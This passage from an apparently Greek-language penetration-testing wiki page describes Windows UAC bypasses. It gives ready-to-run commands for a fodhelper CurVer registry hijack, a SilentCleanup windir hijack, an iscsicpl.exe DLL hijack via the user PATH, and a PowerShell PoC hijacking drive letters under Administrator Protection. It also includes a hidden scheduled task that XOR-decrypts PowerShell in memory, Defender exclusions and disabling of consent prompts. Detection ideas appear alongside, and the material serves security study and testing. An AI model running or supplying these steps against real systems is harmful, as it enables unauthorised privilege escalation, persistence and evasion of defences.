# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Μόλις αποκτήσει elevated privileges, το malware συνήθως **απενεργοποιεί τις μελλοντικές προτροπές** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0` και στη συνέχεια εκτελεί πρόσθετες ενέργειες defense evasion (π.χ., `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί persistence ώστε να εκτελείται με high integrity. Μια τυπική εργασία persistence αποθηκεύει στον δίσκο ένα **κρυπτογραφημένο με XOR PowerShell script** και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και να αφήνει μόνο τα staged payloads, με αποτέλεσμα ο εντοπισμός να βασίζεται στην παρακολούθηση του **`CurVer` hijack**, της παραποίησης του `ConsentPromptBehaviorAdmin`, της δημιουργίας εξαιρέσεων στο Defender ή των scheduled tasks που κάνουν in-memory decrypt το PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass μέσω της εργασίας `SilentCleanup` (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα δικαιώματα και επεκτείνει το `%windir%` από το περιβάλλον χρήστη. Αν ελέγχεις το `HKCU\Environment\windir`, μπορείς να ανακατευθύνεις αυτή την επέκταση σε μια αυθαίρετη εντολή και να αποκτήσεις high integrity χωρίς διάλογο συναίνεσης.<sup>[[8]](#references)</sup> Αυτή η μέθοδος αξίζει ακόμη να δοκιμάζεται σε πρόσφατες εκδόσεις, επειδή το UACME εξακολουθεί να διατηρεί ενεργή την τεχνική και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι τα Windows 11 24H2 μπορεί να απαιτούν μόνο μικρές προσαρμογές στα εισαγωγικά.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Αν η εργασία παραθέτει τη διαδρομή σε αυτό το build, δοκιμάστε ξανά με payload που τελειώνει σε εισαγωγικό (για παράδειγμα `cmd.exe"`). Να καθαρίζετε πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypass που εκμεταλλεύονται ροές εργασίας UI, αντικείμενα COM ή αλληλεπίδραση με την επιφάνεια εργασίας απαιτούν **πλήρη διαδραστική συνεδρία** με το θύμα. Ένα συνηθισμένο shell `nc.exe` ή μια υπηρεσία που εκτελείται στο **Session 0** συχνά δεν αρκεί.

Συχνά μπορείτε να το παρακάμψετε χρησιμοποιώντας μια συνεδρία **meterpreter**. Κάντε migrate σε μια **process** που έχει τιμή **Session** ίση με **1**:

![Ορίστε το ms-settings σε μια προσαρμοσμένη επέκταση (.thm) και αντιστοιχίστε αυτήν την επέκταση στο payload μας - Περισσότερα UAC bypass: Μπορείτε να το πετύχετε χρησιμοποιώντας μια συνεδρία meterpreter. Κάντε migrate σε μια process που έχει τιμή Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass μέσω GUI

Αν έχετε πρόσβαση σε **GUI, μπορείτε απλώς να αποδεχτείτε την προτροπή UAC** όταν εμφανιστεί· δεν χρειάζεστε πραγματικά τεχνικό bypass. Επομένως, η απόκτηση μιας συνεδρίας GUI συχνά αρκεί για να παρακαμφθεί η πρακτική δυσκολία που προσθέτει το UAC.

Επιπλέον, αν αποκτήσετε συνεδρία GUI που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), **ορισμένα εργαλεία θα εκτελούνται ως administrator**, από όπου θα μπορούσατε να **εκτελέσετε** για παράδειγμα ένα **cmd** απευθείας **ως admin**, χωρίς να εμφανιστεί ξανά προτροπή από το UAC, όπως με το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι κάπως πιο **stealthy**.

### Θορυβώδες UAC bypass με brute-force

Αν ο θόρυβος είναι αποδεκτός, ένα εργαλείο όπως το [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) μπορεί να ζητά επανειλημμένα ανύψωση δικαιωμάτων μέχρι να την αποδεχτεί ο χρήστης.

### Το δικό σας bypass - Βασική μεθοδολογία UAC bypass

Αν ρίξετε μια ματιά στο **UACME**, θα παρατηρήσετε ότι **πολλά UAC bypass εκμεταλλεύονται DLL hijacking** (συχνά κάνοντας ένα binary με αυξημένα δικαιώματα να φορτώσει DLL ελεγχόμενο από τον επιτιθέμενο από μια διαδρομή με δυνατότητα εγγραφής). [Διαβάστε εδώ για να μάθετε πώς να εντοπίζετε ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα **ανυψωθεί αυτόματα** (ελέγξτε ότι, όταν εκτελείται, λειτουργεί με υψηλό επίπεδο ακεραιότητας).
2. Με το procmon, εντοπίστε συμβάντα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL σε κάποιες **προστατευμένες διαδρομές** (όπως το C:\Windows\System32), όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να το παρακάμψετε χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7, 8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός αρχείου CAB σε προστατευμένες διαδρομές (επειδή αυτό το εργαλείο εκτελείται με υψηλό επίπεδο ακεραιότητας).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL στην προστατευμένη διαδρομή και να εκτελέσετε το ευάλωτο binary που ανυψώνεται αυτόματα.

### Μια ακόμη τεχνική UAC bypass

Συνίσταται στο να παρακολουθείτε αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/τη διαδρομή** ενός **binary** ή μιας **εντολής** προς **εκτέλεση** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + DLL hijack μέσω `PATH` χρήστη

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα binary που **ανυψώνεται αυτόματα** και μπορεί να γίνει κατάχρηση για να φορτώσει το `iscsiexe.dll` βάσει της σειράς αναζήτησης. Αν μπορείτε να τοποθετήσετε ένα κακόβουλο `iscsiexe.dll` σε έναν φάκελο **εγγράψιμο από τον χρήστη** και στη συνέχεια να τροποποιήσετε το `PATH` του τρέχοντος χρήστη (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον φάκελο, τα Windows ενδέχεται να φορτώσουν το DLL του επιτιθέμενου μέσα στην ανυψωμένη διεργασία `iscsicpl.exe` **χωρίς να εμφανίσουν προτροπή UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο τρέχων χρήστης ανήκει στους **Administrators**, αλλά εκτελείται με **Medium Integrity** λόγω UAC.
- Για αυτό το bypass, σχετικό είναι το αντίγραφο του **SysWOW64**. Αντιμετωπίστε το αντίγραφο του **System32** ως ξεχωριστό binary και επιβεβαιώστε τη συμπεριφορά του ανεξάρτητα.
- Το primitive συνδυάζει **auto-elevation** και **DLL search-order hijacking**, επομένως η ίδια ροή εργασίας ProcMon που χρησιμοποιείται για άλλα UAC bypass είναι χρήσιμη για να επιβεβαιώσετε την απουσία φόρτωσης του DLL.

Ελάχιστη ροή εργασίας:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ιδέες ανίχνευσης:
- Ειδοποίηση για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path`, αμέσως πριν από την εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζήτηση του `iscsiexe.dll` σε τοποθεσίες που ελέγχονται από τον **χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχέτιση των εκκινήσεων του `iscsicpl.exe` με μη αναμενόμενες διεργασίες-παιδιά ή φορτώσεις DLL από τοποθεσίες εκτός των κανονικών καταλόγων των Windows.

### Νεότερη έρευνα που αξίζει να εξεταστεί ξεχωριστά

Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τις κλασικές παραβιάσεις registry `HKCU\Software\Classes`. Για παράδειγμα, η δηλητηρίαση της cache activation-context μπορεί να συνδυάσει ένα **drive remap** και **DLL redirection**, για να αποκτήσει κανείς πρόσβαση από μεσαίο σε υψηλό επίπεδο ακεραιότητας μέσω έμπιστου UI / auto-elevated binaries, όπως το `ctfmon.exe`, και μεταγενέστερων στόχων, όπως το `fodhelper.exe`. Αντί να επαναλάβουμε εδώ το εκτενές PoC, δείτε τα συνοπτικά παραδείγματα payload στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Παραβίαση γράμματος μονάδας δίσκου μέσω per-logon-session DOS device map στο Administrator Protection (preview)

> [!NOTE]
> Από τον Αύγουστο του 2026, η Microsoft εξακολουθεί να τεκμηριώνει το Administrator Protection ως **Insider preview**: η διάθεση του Οκτωβρίου 2025 ανακλήθηκε και έχει προγραμματιστεί για μεταγενέστερη ημερομηνία. Επιβεβαιώστε ότι το **Admin Approval Mode with Administrator protection** είναι όντως ενεργοποιημένο και ότι η συσκευή έχει επανεκκινηθεί πριν δοκιμάσετε αυτές τις αλυσίδες· μια τυπική συμβολοσειρά έκδοσης 25H2 από μόνη της δεν αποδεικνύει ότι η λειτουργία είναι ενεργή.<sup>[[10]](#references)</sup>

Για την πλήρη επιφάνεια επίθεσης `RAiLaunchAdminProcess` / UIAccess σε preview builds των Windows 11 25H2, δείτε την ειδική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το “Administrator Protection” των Windows 11 25H2 χρησιμοποιεί shadow-admin tokens με per-session αντιστοιχίσεις `\Sessions\0\DosDevices/<LUID>`. Ο κατάλογος δημιουργείται κατ' απαίτηση από το `SeGetTokenDeviceMap` κατά την πρώτη επίλυση του `\??`. Αν ο επιτιθέμενος κάνει impersonation του shadow-admin token μόνο στο **SecurityIdentification**, ο κατάλογος δημιουργείται με ιδιοκτήτη τον επιτιθέμενο (κληρονομεί το `CREATOR OWNER`), επιτρέποντας συνδέσμους γραμμάτων μονάδας δίσκου που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια συνεδρία με χαμηλά προνόμια, καλέστε το `RAiProcessRunOnce` για να εκκινήσετε ένα shadow-admin `runonce.exe` χωρίς prompt.
2. Αντιγράψτε το κύριο token του σε token **identification** και κάντε impersonation του καθώς ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ιδιοκτήτη τον επιτιθέμενο.
3. Δημιουργήστε εκεί ένα symlink `C:` που δείχνει σε αποθηκευτικό χώρο ελεγχόμενο από τον επιτιθέμενο· οι επόμενες προσβάσεις στο filesystem σε εκείνη τη συνεδρία επιλύουν το `C:` στη διαδρομή του επιτιθέμενου, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Σε hosts προεπισκόπησης, το Administrator Protection καταγράφει εγκρίσεις και αποτυχίες ως συμβάντα ETW **15031** και **15032** στον provider `Microsoft-Windows-LUA`. Τα συμβάντα περιλαμβάνουν το SID του αιτούντος, τη διαδρομή της εφαρμογής, την έκβαση, τον διαχειριζόμενο λογαριασμό administrator και τη μέθοδο ελέγχου ταυτότητας, επομένως οι επαναλαμβανόμενες απόπειρες exploit ή ο αποτυχημένος χειρισμός του UI δεν περνούν απαρατήρητα από την τηλεμετρία.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί ο Έλεγχος λογαριασμού χρήστη](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών παράκαμψης UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Σαρωτής συμβατότητας και εργαλείο εκκίνησης για παράκαμψη UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Η KONNI υιοθετεί την AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Επιχείρηση TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη του Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Παράκαμψη UAC μέσω της εργασίας SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Παρακάμψεις Always Notify μέσω UnifiedConsent, TabTip και Narrator](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Προστασία διαχειριστή](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Κλήση τοπικών Windows RPC servers από το .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – Η HoneyMyte ενισχύει το CoolClient με ένα υπογεγραμμένο Windows kernel rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Ένα πλήρως μη ανιχνεύσιμο Windows Trojan σχεδιασμένο για κατασκοπεία, κλοπή και τρομοκράτηση](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
